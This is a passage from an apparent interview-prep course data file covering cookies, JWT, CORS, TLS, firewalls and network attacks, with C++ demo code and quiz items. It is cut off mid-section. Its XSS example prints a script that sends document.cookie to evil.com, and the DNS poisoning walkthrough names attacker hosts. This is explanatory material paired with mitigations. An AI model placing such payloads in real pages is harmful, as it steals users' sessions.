            {q: 'WebSocket connections are initiated via:', o: ['A special WebSocket SYN packet', 'An HTTP Upgrade request', 'A UDP handshake', 'A direct TCP connection to port 8080'], a: 1},
          ],
        },
        {
          t: 'Cookies, Sessions, CORS & Authentication',
          learn: '<div class="learn-section"><div class="learn-h">HTTP Cookies</div><p class="learn-p"><b>Cookies</b> are small pieces of data (key-value pairs, max ~4KB) that the server sends to the browser via the <code>Set-Cookie</code> header. The browser stores them and sends them back with every subsequent request to the same domain.</p><div class="learn-code">// Server sets a cookie:\nHTTP/1.1 200 OK\nSet-Cookie: session_id=abc123; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=3600\n\n// Browser sends cookie on subsequent requests:\nGET /dashboard HTTP/1.1\nCookie: session_id=abc123</div><p class="learn-p"><b>Cookie attributes:</b></p><table class="learn-table"><tr><th>Attribute</th><th>Purpose</th></tr><tr><td><code>HttpOnly</code></td><td>Cookie inaccessible to JavaScript (prevents XSS theft)</td></tr><tr><td><code>Secure</code></td><td>Only sent over HTTPS</td></tr><tr><td><code>SameSite=Strict|Lax|None</code></td><td>Controls cross-site sending (CSRF protection)</td></tr><tr><td><code>Max-Age</code> / <code>Expires</code></td><td>Cookie lifetime. No max-age = session cookie (deleted on browser close)</td></tr><tr><td><code>Domain</code></td><td>Which domains receive the cookie</td></tr><tr><td><code>Path</code></td><td>URL path scope for the cookie</td></tr></table></div><div class="learn-section"><div class="learn-h">Sessions</div><p class="learn-p">HTTP is <b>stateless</b> — each request is independent. <b>Sessions</b> maintain state across requests. The server stores session data (user info, cart, etc.) and gives the client a <b>session ID</b> (via cookie or URL).</p><div class="learn-code">Session flow:\n1. Client logs in: POST /login {user, password}\n2. Server creates session: sessions["abc123"] = {userId: 42, role: "admin"}\n3. Server sends: Set-Cookie: session_id=abc123\n4. Client sends cookie with every request\n5. Server looks up sessions["abc123"] to identify the user\n6. On logout: server deletes session, client clears cookie</div><p class="learn-p"><b>Session storage options:</b></p><table class="learn-table"><tr><th>Storage</th><th>Pros</th><th>Cons</th></tr><tr><td>In-memory (server)</td><td>Fast</td><td>Lost on restart, not scalable</td></tr><tr><td>Database</td><td>Persistent, shareable</td><td>Slower, DB load</td></tr><tr><td>Redis/Memcached</td><td>Fast + shareable + TTL</td><td>Extra infrastructure</td></tr></table></div><div class="learn-section"><div class="learn-h">JWT (JSON Web Tokens)</div><p class="learn-p"><b>JWT</b> is a <b>stateless</b> alternative to sessions. The server signs a token containing user claims and sends it to the client. No server-side session storage needed.</p><div class="learn-code">JWT Structure: header.payload.signature\n\nHeader:  {"alg": "HS256", "typ": "JWT"}\nPayload: {"sub": "42", "name": "Alice", "role": "admin", "exp": 1700000000}\nSignature: HMACSHA256(base64(header) + "." + base64(payload), secret)\n\n// Sent as: Authorization: Bearer eyJhbGci...token...</div><table class="learn-table"><tr><th></th><th>Sessions</th><th>JWT</th></tr><tr><td>State</td><td>Server-side (stateful)</td><td>Client-side (stateless)</td></tr><tr><td>Scalability</td><td>Need shared session store</td><td>Any server can verify</td></tr><tr><td>Revocation</td><td>Easy (delete session)</td><td>Hard (token valid until expiry)</td></tr><tr><td>Size</td><td>Small cookie (session ID)</td><td>Larger token (~1KB+)</td></tr></table></div><div class="learn-section"><div class="learn-h">CORS (Cross-Origin Resource Sharing)</div><p class="learn-p"><b>Same-Origin Policy (SOP)</b>: Browsers block JavaScript from making requests to a different origin (protocol + domain + port). <b>CORS</b> is the mechanism that relaxes this restriction.</p><div class="learn-code">// Origin = protocol + domain + port\nhttps://example.com:443  ← origin\n\n// Same origin:  https://example.com/page2\n// Different:    http://example.com (different protocol)\n// Different:    https://api.example.com (different subdomain)\n// Different:    https://example.com:8080 (different port)</div><p class="learn-p"><b>Preflight request:</b> For "non-simple" requests (PUT, DELETE, custom headers, JSON body), the browser first sends an <code>OPTIONS</code> request to check if the server allows it:</p><div class="learn-code">// Preflight request (browser sends automatically):\nOPTIONS /api/data HTTP/1.1\nOrigin: https://frontend.com\nAccess-Control-Request-Method: POST\nAccess-Control-Request-Headers: Content-Type, Authorization\n\n// Server response:\nHTTP/1.1 204 No Content\nAccess-Control-Allow-Origin: https://frontend.com\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE\nAccess-Control-Allow-Headers: Content-Type, Authorization\nAccess-Control-Max-Age: 86400  // cache preflight for 24h\nAccess-Control-Allow-Credentials: true</div><div class="learn-warn"><b>Security warning:</b> Never use <code>Access-Control-Allow-Origin: *</code> with <code>Access-Control-Allow-Credentials: true</code>. This is forbidden by the spec and would allow any website to make authenticated requests to your API.</div></div><div class="learn-section"><div class="learn-h">OAuth 2.0 (Overview)</div><p class="learn-p"><b>OAuth 2.0</b> is an authorization framework that allows third-party apps to access a user\'s resources without knowing their password (e.g., "Login with Google").</p><div class="learn-code">Authorization Code Flow (most secure):\n1. User clicks "Login with Google"\n2. App redirects to Google: /authorize?client_id=X&amp;redirect_uri=Y&amp;scope=email\n3. User authenticates with Google and consents\n4. Google redirects back: Y?code=AUTH_CODE\n5. App exchanges code for tokens (server-to-server):\n   POST /token {code, client_id, client_secret}\n6. Google returns: {access_token, refresh_token, id_token}\n7. App uses access_token to call Google APIs on user\'s behalf</div><div class="learn-tip"><b>Tip:</b> OAuth 2.0 is for <b>authorization</b> (what can you access), not authentication (who are you). <b>OpenID Connect (OIDC)</b> adds an authentication layer on top of OAuth 2.0 by introducing the <code>id_token</code> (a JWT containing user identity).</div></div>',
          code: `// === Cookies, Sessions, and CORS Concepts ===
#include <iostream>
#include <string>
#include <map>
#include <vector>
#include <sstream>
using namespace std;

// Simulate cookie parsing
map<string, string> parseCookies(const string& cookieHeader) {
    map<string, string> cookies;
    stringstream ss(cookieHeader);
    string pair;
    while (getline(ss, pair, ';')) {
        size_t eq = pair.find('=');
        if (eq != string::npos) {
            string key = pair.substr(0, eq);
            string val = pair.substr(eq + 1);
            while (!key.empty() && key[0] == ' ') key = key.substr(1);
            cookies[key] = val;
        }
    }
    return cookies;
}

// Simulate session store
map<string, map<string, string>> sessionStore;

string createSession(const string& userId) {
    string sessionId = "sess_" + to_string(hash<string>{}(userId));
    sessionStore[sessionId]["userId"] = userId;
    sessionStore[sessionId]["created"] = "now";
    return sessionId;
}

map<string, string> getSession(const string& sessionId) {
    if (sessionStore.count(sessionId))
        return sessionStore[sessionId];
    return {};
}

// Simulate CORS check
bool checkCORS(const string& origin, const vector<string>& allowedOrigins) {
    for (const auto& allowed : allowedOrigins) {
        if (allowed == origin || allowed == "*") return true;
    }
    return false;
}

int main() {
    // Parse cookies
    string cookieHeader = "session_id=abc123; theme=dark; lang=en";
    auto cookies = parseCookies(cookieHeader);
    cout << "=== Cookie Parsing ===" << endl;
    for (auto& [k, v] : cookies)
        cout << "  " << k << " = " << v << endl;

    // Session management
    cout << "\\n=== Session Management ===" << endl;
    string sid = createSession("user42");
    cout << "Created session: " << sid << endl;
    auto session = getSession(sid);
    cout << "User ID: " << session["userId"] << endl;

    // CORS check
    cout << "\\n=== CORS Check ===" << endl;
    vector<string> allowed = {"https://frontend.com", "https://admin.com"};
    cout << "https://frontend.com: " << (checkCORS("https://frontend.com", allowed) ? "Allowed" : "Blocked") << endl;
    cout << "https://evil.com: " << (checkCORS("https://evil.com", allowed) ? "Allowed" : "Blocked") << endl;

    return 0;
}`,
          problems: [
            ['CORS Explained', 'https://www.geeksforgeeks.org/cross-origin-resource-sharing-cors/', 'Easy'],
            ['Session vs JWT', 'https://www.geeksforgeeks.org/session-vs-token-based-authentication/', 'Medium'],
            ['OAuth 2.0 Concepts', 'https://www.geeksforgeeks.org/workflow-of-oauth-2-0/', 'Medium'],
          ],
          mcqs: [
            {q: 'Which cookie attribute prevents JavaScript from accessing the cookie?', o: ['Secure', 'SameSite', 'HttpOnly', 'Path'], a: 2},
            {q: 'A CORS preflight request uses which HTTP method?', o: ['GET', 'POST', 'HEAD', 'OPTIONS'], a: 3},
            {q: 'JWT tokens are stateless because:', o: ['They are encrypted', 'The server stores no session data — all claims are in the token', 'They use cookies', 'They expire automatically'], a: 1},
          ],
        },
      ]
    },

    // ==================== TAB 6: Network Security ====================
    {
      id: 'sec', t: 'Network Security',
      topics: [
        {
          t: 'SSL/TLS, Encryption & Firewalls',
          learn: '<div class="learn-section"><div class="learn-h">Cryptography Fundamentals</div><p class="learn-p">Network security relies on <b>cryptography</b> to provide: <b>Confidentiality</b> (data unreadable by unauthorized parties), <b>Integrity</b> (data not tampered with), <b>Authentication</b> (verify identity), and <b>Non-repudiation</b> (sender cannot deny sending). These are sometimes abbreviated as <b>CIAN</b>.</p></div><div class="learn-section"><div class="learn-h">Symmetric vs Asymmetric Encryption</div><table class="learn-table"><tr><th>Feature</th><th>Symmetric Encryption</th><th>Asymmetric Encryption</th></tr><tr><td>Keys</td><td>Single shared secret key</td><td>Public key + Private key pair</td></tr><tr><td>Speed</td><td>Fast (100-1000x faster)</td><td>Slow (computationally expensive)</td></tr><tr><td>Key Distribution</td><td>Problem: how to share key securely?</td><td>Public key shared openly</td></tr><tr><td>Algorithms</td><td>AES, DES, 3DES, ChaCha20</td><td>RSA, ECC, Diffie-Hellman, ECDHE</td></tr><tr><td>Use Case</td><td>Bulk data encryption</td><td>Key exchange, digital signatures</td></tr></table><div class="learn-code">Symmetric: E(key, plaintext) = ciphertext\n           D(key, ciphertext) = plaintext\n           Same key for both!\n\nAsymmetric: E(public_key, plaintext) = ciphertext\n            D(private_key, ciphertext) = plaintext\n            OR\n            Sign(private_key, message) = signature\n            Verify(public_key, message, signature) = true/false</div><div class="learn-tip"><b>Tip:</b> TLS uses <b>both</b>: asymmetric encryption (RSA/ECDHE) for the key exchange during handshake, then symmetric encryption (AES/ChaCha20) for actual data transfer. This is called a <b>hybrid cryptosystem</b>.</div></div><div class="learn-section"><div class="learn-h">Hashing</div><p class="learn-p">A <b>hash function</b> maps arbitrary-length input to a fixed-length output (digest). Properties of cryptographic hash functions:</p><ul class="learn-list"><li><b>Deterministic:</b> Same input always produces same output.</li><li><b>Pre-image resistance:</b> Given hash H, hard to find input M such that hash(M) = H.</li><li><b>Collision resistance:</b> Hard to find two inputs M1 and M2 where hash(M1) = hash(M2).</li><li><b>Avalanche effect:</b> Small change in input causes drastically different output.</li></ul><table class="learn-table"><tr><th>Algorithm</th><th>Output Size</th><th>Status</th></tr><tr><td>MD5</td><td>128 bits</td><td>Broken (collisions found). Do NOT use for security.</td></tr><tr><td>SHA-1</td><td>160 bits</td><td>Deprecated (collisions demonstrated in 2017).</td></tr><tr><td>SHA-256</td><td>256 bits</td><td>Secure. Widely used (TLS, Bitcoin, etc.).</td></tr><tr><td>SHA-3</td><td>Variable</td><td>Secure. Different construction (Keccak).</td></tr></table><p class="learn-p"><b>HMAC (Hash-based Message Authentication Code):</b> Combines a hash function with a secret key to provide both integrity and authentication. <code>HMAC(key, message) = hash(key XOR opad || hash(key XOR ipad || message))</code>.</p></div><div class="learn-section"><div class="learn-h">Digital Certificates and PKI</div><p class="learn-p">A <b>digital certificate</b> binds a public key to an identity (domain name, organization). It is signed by a <b>Certificate Authority (CA)</b>. The browser trusts a set of root CAs; the CA vouches for the server\'s identity.</p><div class="learn-code">Certificate Chain:\n  Root CA (self-signed, pre-installed in browser/OS)\n    |\n    +-- Intermediate CA (signed by Root CA)\n          |\n          +-- Server Certificate for www.example.com\n              (signed by Intermediate CA)\n              Contains: domain name, public key, validity period,\n                        issuer, serial number, signature\n\nVerification:\n1. Browser receives server cert\n2. Checks cert is valid (not expired, domain matches)\n3. Follows chain to a trusted root CA\n4. Verifies each signature in the chain</div></div><div class="learn-section"><div class="learn-h">SSL/TLS In-Depth</div><p class="learn-p"><b>SSL (Secure Sockets Layer)</b> is deprecated (SSL 2.0 and 3.0 are insecure). <b>TLS (Transport Layer Security)</b> is the modern successor. TLS 1.2 and TLS 1.3 are the current standards.</p><p class="learn-p"><b>TLS 1.2 Handshake (detailed):</b></p><ol class="learn-list"><li><b>ClientHello:</b> Client sends: TLS version, supported cipher suites, client random (32 bytes), session ID, extensions (SNI, etc.).</li><li><b>ServerHello:</b> Server selects cipher suite, sends server random.</li><li><b>Certificate:</b> Server sends its certificate chain.</li><li><b>ServerKeyExchange:</b> (For ECDHE) Server sends DH parameters + signature.</li><li><b>ServerHelloDone:</b> Server indicates hello phase complete.</li><li><b>ClientKeyExchange:</b> Client sends its DH public value (or RSA-encrypted pre-master secret).</li><li><b>ChangeCipherSpec:</b> Both sides switch to encrypted communication.</li><li><b>Finished:</b> Both send encrypted verification of the handshake.</li></ol><p class="learn-p"><b>TLS 1.3 improvements:</b></p><ul class="learn-list"><li>Handshake reduced to <b>1-RTT</b> (from 2-RTT in TLS 1.2). Supports <b>0-RTT</b> resumption.</li><li>Removed insecure algorithms: RSA key exchange (no forward secrecy), CBC mode ciphers, SHA-1, MD5, RC4, DES, 3DES.</li><li>Only supports <b>AEAD</b> ciphers: AES-128-GCM, AES-256-GCM, ChaCha20-Poly1305.</li><li><b>Forward secrecy</b> is mandatory (ECDHE only).</li></ul><div class="learn-warn"><b>Warning:</b> <b>Forward secrecy</b> means that compromising the server\'s long-term private key does NOT allow decryption of past sessions. ECDHE provides this because ephemeral keys are used per session. RSA key exchange does NOT provide forward secrecy (which is why TLS 1.3 removed it).</div></div><div class="learn-section"><div class="learn-h">Firewalls</div><p class="learn-p">A <b>firewall</b> monitors and controls incoming/outgoing network traffic based on predefined security rules. Types:</p><table class="learn-table"><tr><th>Type</th><th>Layer</th><th>Description</th></tr><tr><td>Packet Filter</td><td>L3/L4</td><td>Filters based on IP addresses, ports, protocols. Stateless — examines each packet independently.</td></tr><tr><td>Stateful Firewall</td><td>L3/L4</td><td>Tracks connection state (TCP states). Allows return traffic for established connections. More secure than stateless.</td></tr><tr><td>Application Firewall (WAF)</td><td>L7</td><td>Inspects application-layer data (HTTP headers, payloads). Can block SQL injection, XSS, etc.</td></tr><tr><td>Next-Gen Firewall (NGFW)</td><td>L3-L7</td><td>Combines stateful inspection, deep packet inspection, IPS, application awareness.</td></tr></table><div class="learn-code">Firewall Rule Example (iptables-style):\n\n# Allow incoming HTTP and HTTPS\nALLOW  TCP  ANY -&gt; 80   (HTTP)\nALLOW  TCP  ANY -&gt; 443  (HTTPS)\n\n# Allow outgoing DNS\nALLOW  UDP  ANY -&gt; 53   (DNS queries)\n\n# Allow established/related connections\nALLOW  TCP  ESTABLISHED,RELATED\n\n# Block everything else\nDENY   ALL  ANY -&gt; ANY  (default deny)</div></div><div class="learn-section"><div class="learn-h">VPN (Virtual Private Network)</div><p class="learn-p">A VPN creates a <b>secure, encrypted tunnel</b> over a public network (Internet). Types:</p><ul class="learn-list"><li><b>IPSec VPN:</b> Operates at Layer 3. Two modes: <b>Transport</b> (encrypts payload only) and <b>Tunnel</b> (encrypts entire IP packet, adds new IP header). Uses ESP and AH protocols.</li><li><b>SSL/TLS VPN:</b> Operates at Layer 4-7. Uses HTTPS (port 443). Easier to deploy (works through firewalls). Examples: OpenVPN, WireGuard.</li></ul></div><div class="learn-section"><div class="learn-h">IDS/IPS</div><p class="learn-p"><b>IDS (Intrusion Detection System):</b> Monitors network traffic for suspicious patterns and alerts administrators. Passive — does not block traffic.</p><p class="learn-p"><b>IPS (Intrusion Prevention System):</b> Like IDS but <b>actively blocks</b> detected threats. Sits inline in the network path.</p><p class="learn-p">Detection methods: <b>Signature-based</b> (known attack patterns), <b>Anomaly-based</b> (deviations from baseline), <b>Heuristic</b> (behavioral analysis).</p></div>',
          code: `// === Cryptography & Security Demonstrations in C++ ===
#include <iostream>
#include <string>
#include <vector>
#include <map>
#include <sstream>
#include <iomanip>
#include <cstring>
using namespace std;

// ---- Simple Caesar Cipher (Symmetric) ----
string caesarEncrypt(const string& plaintext, int shift) {
    string ciphertext;
    for (char c : plaintext) {
        if (isalpha(c)) {
            char base = isupper(c) ? 'A' : 'a';
            ciphertext += (char)((c - base + shift) % 26 + base);
        } else {
            ciphertext += c;
        }
    }
    return ciphertext;
}

string caesarDecrypt(const string& ciphertext, int shift) {
    return caesarEncrypt(ciphertext, 26 - shift);
}

// ---- XOR Cipher (simple symmetric) ----
string xorCipher(const string& data, const string& key) {
    string result;
    for (size_t i = 0; i < data.size(); i++) {
        result += (char)(data[i] ^ key[i % key.size()]);
    }
    return result;
}

// ---- Simple Hash Function (DJB2) ----
uint32_t djb2Hash(const string& str) {
    uint32_t hash = 5381;
    for (char c : str) {
        hash = ((hash << 5) + hash) + c; // hash * 33 + c
    }
    return hash;
}

void demonstrateHashing() {
    cout << "=== Hashing Demonstration ===" << endl;
    vector<string> inputs = {
        "hello", "Hello", "hello!", "hello world",
        "The quick brown fox"
    };
    for (auto& s : inputs) {
        cout << "  hash(\"" << s << "\") = 0x"
             << hex << setfill('0') << setw(8)
             << djb2Hash(s) << dec << endl;
    }
    // Demonstrate avalanche effect
    cout << "\\nAvalanche effect:" << endl;
    cout << "  hash(\"hello\") = 0x" << hex << djb2Hash("hello") << dec << endl;
    cout << "  hash(\"hellp\") = 0x" << hex << djb2Hash("hellp") << dec << endl;
}

// ---- RSA Key Generation (simplified, small numbers) ----
struct RSAKeys {
    long long n, e, d;  // public = (n, e), private = (n, d)
};

long long gcd(long long a, long long b) {
    return b == 0 ? a : gcd(b, a % b);
}

long long modPow(long long base, long long exp, long long mod) {
    long long result = 1;
    base %= mod;
    while (exp > 0) {
        if (exp & 1) result = (result * base) % mod;
        exp >>= 1;
        base = (base * base) % mod;
    }
    return result;
}

long long modInverse(long long a, long long m) {
    // Extended Euclidean
    long long m0 = m, y = 0, x = 1;
    if (m == 1) return 0;
    while (a > 1) {
        long long q = a / m;
        long long t = m;
        m = a % m;
        a = t;
        t = y;
        y = x - q * y;
        x = t;
    }
    if (x < 0) x += m0;
    return x;
}

RSAKeys generateRSA() {
    // Using small primes for demonstration
    long long p = 61, q = 53;
    long long n = p * q;               // 3233
    long long phi = (p - 1) * (q - 1); // 3120

    // Choose e (commonly 65537, but use 17 for small demo)
    long long e = 17;
    while (gcd(e, phi) != 1) e += 2;

    long long d = modInverse(e, phi);
    return {n, e, d};
}

void demonstrateRSA() {
    cout << "\\n=== RSA Encryption (Simplified) ===" << endl;
    RSAKeys keys = generateRSA();
    cout << "  Public Key:  (n=" << keys.n << ", e=" << keys.e << ")" << endl;
    cout << "  Private Key: (n=" << keys.n << ", d=" << keys.d << ")" << endl;

    long long message = 42;
    cout << "  Original message: " << message << endl;

    long long encrypted = modPow(message, keys.e, keys.n);
    cout << "  Encrypted: " << encrypted << endl;

    long long decrypted = modPow(encrypted, keys.d, keys.n);
    cout << "  Decrypted: " << decrypted << endl;

    // Digital signature
    long long signature = modPow(message, keys.d, keys.n);
    cout << "  Signature of " << message << ": " << signature << endl;
    long long verified = modPow(signature, keys.e, keys.n);
    cout << "  Verified: " << verified
         << (verified == message ? " (VALID)" : " (INVALID)") << endl;
}

// ---- TLS Handshake Simulation ----
void simulateTLSHandshake() {
    cout << "\\n=== TLS 1.2 Handshake Simulation ===" << endl;

    cout << "--- Step 1: ClientHello ---" << endl;
    cout << "  TLS Version: 1.2" << endl;
    cout << "  Cipher Suites: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, ..."
         << endl;
    cout << "  Client Random: 0x" << hex << 0xABCDEF01 << dec << "..." << endl;
    cout << "  Extensions: SNI=www.example.com" << endl;

    cout << "--- Step 2: ServerHello ---" << endl;
    cout << "  Selected: TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256" << endl;
    cout << "  Server Random: 0x" << hex << 0x12345678 << dec << "..." << endl;

    cout << "--- Step 3: Certificate ---" << endl;
    cout << "  Server cert: CN=www.example.com" << endl;
    cout << "  Issuer: Let's Encrypt Authority X3" << endl;
    cout << "  Valid: 2026-01-01 to 2026-12-31" << endl;

    cout << "--- Step 4: ServerKeyExchange (ECDHE) ---" << endl;
    cout << "  Curve: secp256r1" << endl;
    cout << "  Server ECDH Public Key: (Qx, Qy)" << endl;

    cout << "--- Step 5: ClientKeyExchange ---" << endl;
    cout << "  Client ECDH Public Key: (Rx, Ry)" << endl;
    cout << "  Shared secret computed via ECDH" << endl;

    cout << "--- Step 6: Key Derivation ---" << endl;
    cout << "  Pre-master secret -> Master secret (PRF)" << endl;
    cout << "  Master secret -> Session keys" << endl;
    cout << "    Client write key, Server write key" << endl;
    cout << "    Client write IV, Server write IV" << endl;

    cout << "--- Step 7: ChangeCipherSpec + Finished ---" << endl;
    cout << "  Both sides switch to encrypted communication" << endl;
    cout << "  ** TLS Handshake Complete! **" << endl;
    cout << "  All further data encrypted with AES-128-GCM" << endl;
}

// ---- Firewall Rule Engine ----
struct FirewallRule {
    string action;  // ALLOW or DENY
    string protocol; // TCP, UDP, ALL
    int dstPort;    // -1 for any
    string srcIP;   // "ANY" for any
};

class Firewall {
    vector<FirewallRule> rules;
public:
    void addRule(string action, string proto, int port, string src) {
        rules.push_back({action, proto, port, src});
    }

    string evaluate(string proto, string srcIP, int dstPort) {
        for (auto& rule : rules) {
            bool protoMatch = (rule.protocol == "ALL" || rule.protocol == proto);
            bool portMatch = (rule.dstPort == -1 || rule.dstPort == dstPort);
            bool srcMatch = (rule.srcIP == "ANY" || rule.srcIP == srcIP);
            if (protoMatch && portMatch && srcMatch) {
                return rule.action;
            }
        }
        return "DENY"; // default deny
    }
};

void demonstrateFirewall() {
    cout << "\\n=== Firewall Rule Engine ===" << endl;
    Firewall fw;
    fw.addRule("ALLOW", "TCP", 80, "ANY");
    fw.addRule("ALLOW", "TCP", 443, "ANY");
    fw.addRule("ALLOW", "UDP", 53, "ANY");
    fw.addRule("ALLOW", "TCP", 22, "10.0.0.0");
    fw.addRule("DENY", "ALL", -1, "ANY"); // default deny

    struct TestPacket { string proto; string src; int port; };
    vector<TestPacket> tests = {
        {"TCP", "1.2.3.4", 80},
        {"TCP", "1.2.3.4", 443},
        {"TCP", "1.2.3.4", 22},
        {"TCP", "10.0.0.0", 22},
        {"UDP", "5.5.5.5", 53},
        {"TCP", "1.2.3.4", 3306},
    };

    for (auto& t : tests) {
        string result = fw.evaluate(t.proto, t.src, t.port);
        cout << "  " << t.proto << " " << t.src << ":" << t.port
             << " -> " << result << endl;
    }
}

int main() {
    demonstrateHashing();
    demonstrateRSA();
    simulateTLSHandshake();
    demonstrateFirewall();
    return 0;
}`,
          problems: [
            ['SSL/TLS Handshake Explained', 'https://www.geeksforgeeks.org/ssl-tls-handshake/', 'Medium'],
            ['Symmetric vs Asymmetric Encryption', 'https://www.geeksforgeeks.org/difference-between-symmetric-and-asymmetric-key-encryption/', 'Easy'],
            ['Firewall Types and Architecture', 'https://www.geeksforgeeks.org/types-of-firewall-and-possible-attacks/', 'Medium'],
          ],
          mcqs: [
            {q: 'TLS uses asymmetric encryption for:', o: ['Encrypting all data', 'Key exchange during handshake', 'Computing checksums', 'Compressing data'], a: 1},
            {q: 'Which TLS version removed RSA key exchange for mandatory forward secrecy?', o: ['TLS 1.0', 'TLS 1.1', 'TLS 1.2', 'TLS 1.3'], a: 3},
            {q: 'A stateful firewall differs from a packet filter firewall because it:', o: ['Operates at Layer 7', 'Tracks TCP connection states', 'Uses deep learning', 'Requires a VPN'], a: 1},
          ],
        },
        {
          t: 'Common Attacks (DDoS, MITM, DNS Spoofing, XSS)',
          learn: '<div class="learn-section"><div class="learn-h">Network Attack Categories</div><p class="learn-p">Network attacks can be broadly classified into:</p><ul class="learn-list"><li><b>Passive attacks:</b> Eavesdropping, traffic analysis — attacker only observes, does not modify data.</li><li><b>Active attacks:</b> Modification, impersonation, replay, denial of service — attacker alters data or disrupts service.</li></ul><p class="learn-p">Understanding these attacks and their mitigations is crucial for system design interviews at DE Shaw, where security is a key consideration for financial systems.</p></div><div class="learn-section"><div class="learn-h">DDoS (Distributed Denial of Service)</div><p class="learn-p">A <b>DDoS attack</b> floods a target with overwhelming traffic from many compromised machines (<b>botnet</b>), making the service unavailable to legitimate users.</p><p class="learn-p"><b>Types of DDoS attacks:</b></p><table class="learn-table"><tr><th>Type</th><th>Layer</th><th>Mechanism</th><th>Example</th></tr><tr><td>Volumetric</td><td>L3/L4</td><td>Flood bandwidth</td><td>UDP flood, ICMP flood, DNS amplification</td></tr><tr><td>Protocol</td><td>L3/L4</td><td>Exploit protocol weaknesses</td><td>SYN flood, Smurf attack, Ping of Death</td></tr><tr><td>Application</td><td>L7</td><td>Exhaust server resources</td><td>HTTP flood, Slowloris, RUDY</td></tr></table><p class="learn-p"><b>SYN Flood Attack:</b> Attacker sends many SYN packets with <b>spoofed source IPs</b>. The server allocates resources for each half-open connection (SYN_RCVD state) and sends SYN-ACK to the spoofed addresses. Since no ACK comes back, connections time out slowly, exhausting the server\'s connection table.</p><div class="learn-code">SYN Flood:\nAttacker --SYN(spoofed IP)--> Server\nAttacker --SYN(spoofed IP)--> Server\nAttacker --SYN(spoofed IP)--> Server\n... (thousands per second)\n\nServer\'s SYN queue fills up -> legitimate connections rejected\n\nMitigation:\n- SYN Cookies: Don\'t allocate state until ACK received.\n  Server encodes connection info in the ISN (sequence number).\n  On receiving ACK, reconstructs state from the cookie.\n- Rate limiting SYN packets\n- Increase SYN queue size / decrease timeout\n- IP reputation filtering</div><p class="learn-p"><b>DNS Amplification Attack:</b> Attacker sends small DNS queries with <b>spoofed source IP (victim\'s IP)</b> to open DNS resolvers. The resolvers send large responses to the victim. Amplification factor can be 50-70x.</p><div class="learn-code">DNS Amplification:\nAttacker (src IP spoofed as Victim) --> DNS Resolver\n   Query: "ANY record for large-domain.com" (60 bytes)\n\nDNS Resolver --> Victim\n   Response: 3000+ bytes of DNS records\n\nAmplification: 3000/60 = 50x !</div><p class="learn-p"><b>DDoS Mitigations:</b></p><ul class="learn-list"><li><b>CDN/DDoS protection services:</b> Cloudflare, AWS Shield, Akamai absorb traffic.</li><li><b>Rate limiting:</b> Limit requests per IP per second.</li><li><b>Anycast routing:</b> Distribute attack traffic across multiple data centers.</li><li><b>Traffic scrubbing:</b> Filter malicious traffic before it reaches the server.</li><li><b>Blackhole routing:</b> Send attack traffic to a null route (last resort).</li></ul></div><div class="learn-section"><div class="learn-h">MITM (Man-in-the-Middle) Attack</div><p class="learn-p">In a <b>MITM attack</b>, the attacker secretly intercepts and possibly alters communication between two parties who believe they are communicating directly with each other.</p><p class="learn-p"><b>Common MITM techniques:</b></p><ul class="learn-list"><li><b>ARP Spoofing/Poisoning:</b> Attacker sends fake ARP replies to associate their MAC address with the gateway\'s IP. All traffic from victims passes through the attacker.</li><li><b>Evil Twin Wi-Fi:</b> Attacker creates a rogue Wi-Fi access point with the same SSID as a legitimate one. Users unknowingly connect to the attacker\'s network.</li><li><b>SSL Stripping:</b> Attacker downgrades HTTPS to HTTP by intercepting the initial redirect. User sees HTTP (no padlock) but may not notice.</li><li><b>Session Hijacking:</b> Attacker steals session cookies (via XSS, sniffing) to impersonate the user.</li></ul><div class="learn-code">ARP Spoofing:\n\nNormal: Victim ARP table: Gateway IP -> Gateway MAC\nAttack: Attacker sends: "Gateway IP is at ATTACKER MAC"\n        Victim ARP table: Gateway IP -> ATTACKER MAC\n\nResult: All traffic from victim goes to attacker first.\n        Attacker forwards to real gateway (transparent proxy).\n        Attacker can read/modify all unencrypted traffic.\n\nMitigation:\n- Use HTTPS everywhere\n- Dynamic ARP Inspection (DAI) on switches\n- Static ARP entries for critical hosts\n- VPN for sensitive communication</div><div class="learn-warn"><b>Warning:</b> HTTPS with proper certificate validation is the primary defense against MITM. If the user ignores browser certificate warnings ("This connection is not secure"), they are vulnerable even with HTTPS.</div></div><div class="learn-section"><div class="learn-h">DNS Spoofing / DNS Cache Poisoning</div><p class="learn-p"><b>DNS Spoofing</b> involves providing false DNS responses to redirect users to malicious sites. <b>DNS Cache Poisoning</b> specifically targets the DNS resolver\'s cache.</p><div class="learn-code">DNS Cache Poisoning (Kaminsky Attack):\n\n1. Attacker queries resolver for random.example.com\n2. Resolver queries authoritative server for example.com\n3. Before real response arrives, attacker floods resolver with\n   forged responses claiming:\n   "random.example.com -> ATTACKER_IP"\n   AND "example.com NS -> attacker-ns.evil.com"\n4. If forged response matches transaction ID and arrives first,\n   resolver caches the poisoned NS record\n5. ALL future queries for *.example.com go to attacker\'s DNS\n\nMitigations:\n- DNSSEC: Cryptographically signs DNS records\n- Source port randomization (increases attack difficulty)\n- DNS over HTTPS (DoH) / DNS over TLS (DoT)\n- 0x20 encoding (randomize case in queries)</div></div><div class="learn-section"><div class="learn-h">XSS (Cross-Site Scripting)</div><p class="learn-p"><b>XSS</b> is a web application vulnerability where an attacker injects <b>malicious scripts</b> into web pages viewed by other users. While primarily a web security issue, understanding XSS is important for application-layer network security.</p><p class="learn-p"><b>Types of XSS:</b></p><table class="learn-table"><tr><th>Type</th><th>Description</th><th>Example</th></tr><tr><td>Stored (Persistent)</td><td>Malicious script stored in database, served to all visitors</td><td>Forum post with &lt;script&gt; tag</td></tr><tr><td>Reflected</td><td>Script in URL parameter, reflected back in response</td><td>Search query: &lt;script&gt;alert(1)&lt;/script&gt;</td></tr><tr><td>DOM-based</td><td>Script manipulates client-side DOM directly</td><td>JavaScript reads URL hash and injects into page</td></tr></table><div class="learn-code">Stored XSS Example:\n\n1. Attacker posts comment:\n   "Nice article! &lt;script&gt;fetch(\'https://evil.com/steal?\'+document.cookie)&lt;/script&gt;"\n\n2. Server stores comment in database.\n\n3. When other users view the page, the script runs\n   in their browser, stealing their cookies.\n\nMitigations:\n- Input validation and sanitization\n- Output encoding (HTML entity encoding)\n- Content-Security-Policy (CSP) header\n- HttpOnly flag on cookies (prevents JS access)\n- Use frameworks that auto-escape output (React, Angular)</div></div><div class="learn-section"><div class="learn-h">Other Important Attacks</div><p class="learn-p"><b>SQL Injection:</b> Attacker inserts 